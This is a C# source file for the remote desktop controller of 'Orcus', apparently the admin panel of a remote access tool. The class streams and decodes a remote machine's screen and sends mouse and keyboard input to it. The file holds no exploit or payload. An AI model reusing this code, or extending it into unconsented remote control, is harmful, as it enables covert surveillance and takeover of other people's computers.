using System;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using Orcus.Administration.Commands.ConnectionInitializer;
using Orcus.Administration.Commands.ConnectionInitializer.Connections;
using Orcus.Administration.Commands.Native;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Commands.RemoteDesktop.Compression;
using Orcus.Shared.Commands.RemoteDesktop;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities.Compression;
using DataReceivedEventArgs = Orcus.Administration.Commands.ConnectionInitializer.DataReceivedEventArgs;

namespace Orcus.Administration.Commands.RemoteDesktop
{
    [ProvideLibrary(PortableLibrary.SharpDX)]
    [ProvideLibrary(PortableLibrary.SharpDX_DXGI)]
    [ProvideLibrary(PortableLibrary.SharpDX_Direct3D11)]
    [ProvideLibrary(PortableLibrary.SharpDX_Direct3D9)]
    [ProvideLibrary(PortableLibrary.TurboJpegWrapper)]
    [DescribeCommandByEnum(typeof(RemoteDesktopCommunication))]
    public class RemoteDesktopCommandLocal : Command
    {
        private readonly object _updateLock = new object();
        private ImageCompressionType _compressionType;
        private IImageCompression _currentImageCompression;
        private int _currentlyStreamedMonitor;
        private ScreenInfo _currentScreen;
        private CursorStreamCodec _cursorStreamCodec;
        private int _framesReceived;
        private DateTime _frameTimestamp;
        private int _imageQuality = 70;
        private bool _isDisposed;
        private IConnection _remoteConnection;
        private bool _showCursor;
        private IStreamCodec _streamCodec;
        private WriteableBitmap _writeableBitmap;

        public override void Dispose()
        {
            base.Dispose();

            //important, else dead lock because this is UI thread and lock invokdes into UI thread -> block
            Task.Run(() =>
            {
                lock (_updateLock)
                {
                    _remoteConnection?.Dispose();
                    _streamCodec?.Dispose();
                    _cursorStreamCodec?.Dispose();
                    _isDisposed = true;
                }
            });
        }

        public RemoteDesktopInformation RemoteDesktopInformation { get; private set; }

        public int ImageQuality
        {
            get { return _imageQuality; }
            set
            {
                if (_imageQuality != value)
                {
                    _imageQuality = value;
                    if (IsStreaming)
                        ConnectionInfo.SendCommand(this,
                            new[] {(byte) RemoteDesktopCommunication.ChangeQuality, (byte) value});
                }
            }
        }

        public ScreenInfo CurrentScreen
        {
            get { return _currentScreen; }
            set
            {
                if (!value.Equals(_currentScreen))
                {
                    _currentScreen = value;
                    if (IsStreaming)
                        ConnectionInfo.SendCommand(this,
                            new[] {(byte) RemoteDesktopCommunication.ChangeMonitor, (byte) value.Number});
                }
            }
        }

        public bool ShowCursor
        {
            get { return _showCursor; }
            set
            {
                if (_showCursor != value)
                {
                    _showCursor = value;
                    if (IsStreaming)
                        ConnectionInfo.SendCommand(this,
                            new[] {(byte) RemoteDesktopCommunication.ChangeDrawCursor, (byte) (value ? 1 : 0)});
                }
            }
        }

        public CaptureType CaptureType { get; private set; }

        public WriteableBitmap WriteableBitmap
        {
            get { return _writeableBitmap; }
            private set
            {
                if (_writeableBitmap != value)
                {
                    _writeableBitmap = value;
                    UpdateWriteableBitmap?.Invoke(this, EventArgs.Empty);
                }
            }
        }

        public bool IsStreaming { get; private set; }
        public int FramesPerSecond { get; private set; }

        public event EventHandler<RemoteDesktopInformation> RemoteDesktopInformationReceived;
        public event EventHandler UpdateWriteableBitmap;
        public event EventHandler Initialized;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((RemoteDesktopCommunication) parameter[0])
            {
                case RemoteDesktopCommunication.ResponseInfo:
                    RemoteDesktopInformation = Serializer.FastDeserialize<RemoteDesktopInformation>(parameter, 1);
                    RemoteDesktopInformationReceived?.Invoke(this, RemoteDesktopInformation);
                    CurrentScreen = RemoteDesktopInformation.Screens.First();
                    LogService.Receive((string) Application.Current.Resources["RemoteDesktopInformationReceived"]);
                    break;
                case RemoteDesktopCommunication.ResponseInitializationFailed:
                    LogService.Error(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                case RemoteDesktopCommunication.ResponseInitializationSucceeded:
                    Initialized?.Invoke(this, EventArgs.Empty);
                    LogService.Receive((string) Application.Current.Resources["InitializationSuccessful"]);
                    break;
                case RemoteDesktopCommunication.ResponseFrame:
                    if (_remoteConnection is ServerConnection)
                        ConnectionOnDataReceived(this, new DataReceivedEventArgs(parameter, 1, parameter.Length - 1));
                    break;
                case RemoteDesktopCommunication.ResponseCaptureCancelled:
                    Stop(true);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void GetRemoteDesktopInformation()
        {
            ConnectionInfo.SendCommand(this, (byte) RemoteDesktopCommunication.GetInfo);
            LogService.Send((string) Application.Current.Resources["GetRemoteDesktopInformation"]);
        }

        public async Task InitializeRemoteDesktopDirect(CaptureType captureType, ImageCompressionType compressionType)
        {
            await ConnectionInfo.SendCommand(this, (byte) RemoteDesktopCommunication.InitializeDirectConnection);
            InitializeConnection(new ServerConnection(), captureType);

            await InitializeRemoteComponents(captureType, compressionType);

            LogService.Send((string) Application.Current.Resources["InitializeRemoteDesktop"]);
        }

        public async Task InitializeRemoteDesktop(InitializedConnection initializedConnection, CaptureType captureType,
            ImageCompressionType compressionType)
        {
            InitializeConnection(initializedConnection.Connection, captureType);

            await ConnectionInfo.UnsafeSendCommand(this, 17, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.InitializeConnection);
                writer.Write(initializedConnection.RemoteConnectionGuid.ToByteArray());
            });
            await InitializeRemoteComponents(captureType, compressionType);
            LogService.Send((string) Application.Current.Resources["InitializeRemoteDesktop"]);
        }

        public void MouseMove(int x, int y)
        {
            ConnectionInfo.UnsafeSendCommand(this, 15, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) RemoteDesktopMouseAction.Move);
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseDown(int x, int y, MouseButton mouseButton)
        {
            ConnectionInfo.UnsafeSendCommand(this, 15, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) MouseButtonToAction(mouseButton, true));
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseUp(int x, int y, MouseButton mouseButton)
        {
            ConnectionInfo.UnsafeSendCommand(this, 15, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) MouseButtonToAction(mouseButton, false));
                writer.Write(x);
                writer.Write(y);
                writer.Write(0);
            });
        }

        public void MouseWheel(int x, int y, int delta)
        {
            ConnectionInfo.UnsafeSendCommand(this, 15, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Mouse);
                writer.Write((byte) RemoteDesktopMouseAction.Wheel);
                writer.Write(x);
                writer.Write(y);
                writer.Write(delta);
            });
        }

        public void KeyDown(int virtualKey)
        {
            var scanCode = (short) NativeMethods.MapVirtualKey((uint) virtualKey, MapVirtualKeyMapTypes.MAPVK_VK_TO_VSC);
            ConnectionInfo.UnsafeSendCommand(this, 5, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Keyboard);
                writer.Write((byte) RemoteDesktopKeyboardAction.KeyDown);
                writer.Write(scanCode);
            });
        }

        public void KeyUp(int virtualKey)
        {
            var scanCode = (short) NativeMethods.MapVirtualKey((uint) virtualKey, MapVirtualKeyMapTypes.MAPVK_VK_TO_VSC);
            ConnectionInfo.UnsafeSendCommand(this, 5, writer =>
            {
                writer.Write((byte) RemoteDesktopCommunication.DesktopAction);
                writer.Write((byte) RemoteDesktopAction.Keyboard);
                writer.Write((byte) RemoteDesktopKeyboardAction.KeyUp);
                writer.Write(scanCode);
            });
        }

        private RemoteDesktopMouseAction MouseButtonToAction(MouseButton mouseButton, bool isDown)
        {
            switch (mouseButton)
            {
                case MouseButton.Left:
                    return isDown ? RemoteDesktopMouseAction.LeftDown : RemoteDesktopMouseAction.LeftUp;
                case MouseButton.Middle:
                    return isDown ? RemoteDesktopMouseAction.MiddleDown : RemoteDesktopMouseAction.MiddleUp;
                case MouseButton.Right:
                    return isDown ? RemoteDesktopMouseAction.RightDown : RemoteDesktopMouseAction.RightUp;
                case MouseButton.XButton1:
                    return isDown ? RemoteDesktopMouseAction.XButton1Down : RemoteDesktopMouseAction.XButton1Up;
                case MouseButton.XButton2:
                    return isDown ? RemoteDesktopMouseAction.XButton2Down : RemoteDesktopMouseAction.XButton2Up;
                default:
                    throw new ArgumentOutOfRangeException(nameof(mouseButton), mouseButton, null);
            }
        }

        public void Start()
        {
            if (IsStreaming)
                return;

            Debug.Print("Start");
            ConnectionInfo.SendCommand(this, new[] {(byte) RemoteDesktopCommunication.Start});
            IsStreaming = true;

            LogService.Send((string) Application.Current.Resources["StartStreaming"]);
        }

        private async Task Stop(bool remoteCancelled)
        {
            if (!IsStreaming)
                return;

            if (!remoteCancelled)
                await ConnectionInfo.SendCommand(this, (byte) RemoteDesktopCommunication.Stop);

            //important, else dead lock because this is UI thread and lock invokdes into UI thread -> block
            await Task.Run(() =>
            {
                lock (_updateLock)
                {
                    IsStreaming = false;
                }
            });

            FramesPerSecond = 0;
            _framesReceived = 0;

            _cursorStreamCodec?.Dispose();
            _streamCodec?.Dispose();
            _currentImageCompression?.Dispose();
            _remoteConnection?.Dispose();

            _remoteConnection = null;
            _currentImageCompression = null;
            _cursorStreamCodec = null;
            _streamCodec = null;

            LogService.Send((string) Application.Current.Resources["StopRemoteDesktop"]);
        }

        public Task Stop()
        {
            return Stop(false);
        }

        public async Task<BitmapFrame> GetBitmapFrame()
        {
            var getterTask = await Task.Run(() =>
            {
                lock (_updateLock)
                {
                    return Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Render,
                        new Func<BitmapFrame>(() => BitmapFrame.Create(WriteableBitmap)));
                }
            });

            await getterTask.Task;
            return (BitmapFrame) getterTask.Result;
        }

        public async Task<WriteableBitmap> GetWriteableBitmapClone()
        {
            var getterTask = await Task.Run(() =>
            {
                lock (_updateLock)
                {
                    return Application.Current.Dispatcher.BeginInvoke(DispatcherPriority.Render,
                        new Func<WriteableBitmap>(() => WriteableBitmap.Clone()));
                }
            });

            await getterTask.Task;
            return (WriteableBitmap) getterTask.Result;
        }

        private unsafe void ConnectionOnDataReceived(object sender, DataReceivedEventArgs dataReceivedEventArgs)
        {
            if (_isDisposed || !IsStreaming)
                return;

            lock (_updateLock)
            {
                if (_isDisposed || !IsStreaming)
                    return;

                var position = dataReceivedEventArgs.Index;
                var flags = (ScreenResponseFlags) dataReceivedEventArgs.Buffer[position];
                position++;

                var cursorDataLength = 0;

                if ((flags & ScreenResponseFlags.Cursor) == ScreenResponseFlags.Cursor)
                {
                    cursorDataLength = BitConverter.ToInt32(dataReceivedEventArgs.Buffer, position);
                    position += cursorDataLength + 4;
                }

                var monitor = dataReceivedEventArgs.Buffer[position];
                position++;

                if (monitor != _currentlyStreamedMonitor)
                {
                    _streamCodec?.Dispose();
                    _streamCodec = new UnsafeStreamCodec(GetImageCompression(_compressionType),
                        UnsafeStreamCodecParameters.DontDisposeImageCompressor);

                    _currentlyStreamedMonitor = monitor;
                }

                try
                {
                    fixed (byte* bufferPointer = dataReceivedEventArgs.Buffer)
                    {
                        if (cursorDataLength != 0)
                        {
                            WriteableBitmap = _streamCodec.AppendModifier(
                                _cursorStreamCodec.CreateModifierTask(dataReceivedEventArgs.Buffer,
                                    dataReceivedEventArgs.Index + 5, cursorDataLength)).DecodeData(bufferPointer + position,
                                (uint)(dataReceivedEventArgs.Length - (position - dataReceivedEventArgs.Index)),
                                Application.Current.Dispatcher);
                        }
                        else
                        {
                            WriteableBitmap = _streamCodec.DecodeData(bufferPointer + position,
                                (uint)(dataReceivedEventArgs.Length - (position - dataReceivedEventArgs.Index)),
                                Application.Current.Dispatcher);
                        }
                    }
                }
                catch (InvalidOperationException)
                {
                    //this happens when the main window closes and the writeablebitmap is already disposed
                    try
                    {
                        if (WriteableBitmap.BackBufferStride == 0)
                            return;
                    }
                    catch (Exception)
                    {
                        return;
                    }

                    throw;
                }
            }

            var framesReceived = Interlocked.Increment(ref _framesReceived);

            if (FramesPerSecond == 0 && framesReceived == 0)
                _frameTimestamp = DateTime.UtcNow;
            else if (DateTime.UtcNow - _frameTimestamp > TimeSpan.FromSeconds(1))
            {
                FramesPerSecond = framesReceived;
                Interlocked.Exchange(ref _framesReceived, 0);
                _frameTimestamp = DateTime.UtcNow;
            }
        }

        private void InitializeConnection(IConnection connection, CaptureType captureType)
        {
            CaptureType = captureType;

            _remoteConnection = connection;
            connection.DataReceived += ConnectionOnDataReceived;
        }

        private async Task InitializeRemoteComponents(CaptureType captureType, ImageCompressionType compressionType)
        {
            await ConnectionInfo.SendCommand(this, new[]
            {
                (byte) RemoteDesktopCommunication.Initialize, (byte) captureType, (byte) CurrentScreen.Number,
                (byte) ImageQuality, ShowCursor ? (byte) 1 : (byte) 0, (byte) compressionType
            });
            /*ConnectionInfo.Sender.UnsafeSendCommand(ConnectionInfo.ClientInformation.Id, Identifier,
                new WriterCall(new[]
                {
                    (byte) RemoteDesktopCommunication.Initialize, (byte) captureType, (byte) CurrentScreen.Number,
                    (byte) ImageQuality, ShowCursor ? (byte) 1 : (byte) 0, (byte) compressionType
                }));*/
           // ConnectionInfo.UnsafeSendCommand(this, new WriterCall(new[]
          //  {
           //     (byte) RemoteDesktopCommunication.Initialize, (byte) captureType, (byte) CurrentScreen.Number,
          //      (byte) ImageQuality, ShowCursor ? (byte) 1 : (byte) 0, (byte) compressionType
           // }));

            CaptureType = captureType;

            _currentlyStreamedMonitor = CurrentScreen.Number;

            _streamCodec?.Dispose();
            _cursorStreamCodec?.Dispose();

            _streamCodec = new UnsafeStreamCodec(GetImageCompression(compressionType),
                UnsafeStreamCodecParameters.DontDisposeImageCompressor);
            _cursorStreamCodec = new CursorStreamCodec();
        }

        private IImageCompression GetImageCompression(ImageCompressionType compressionType)
        {
            if (_compressionType == compressionType && _currentImageCompression != null)
                return _currentImageCompression;

            _currentImageCompression?.Dispose();
            _compressionType = compressionType;

            switch (compressionType)
            {
                case ImageCompressionType.ManagedJpg:
                    return _currentImageCompression = new JpgCompression(70);
                case ImageCompressionType.TurboJpg:
                    return _currentImageCompression = new TurboJpgImageCompression(true);
                case ImageCompressionType.NoCompression:
                    return new NoCompression();
                default:
                    throw new ArgumentOutOfRangeException(nameof(compressionType), compressionType, null);
            }
        }

        protected override uint GetId()
        {
            return 14;
        }
    }
}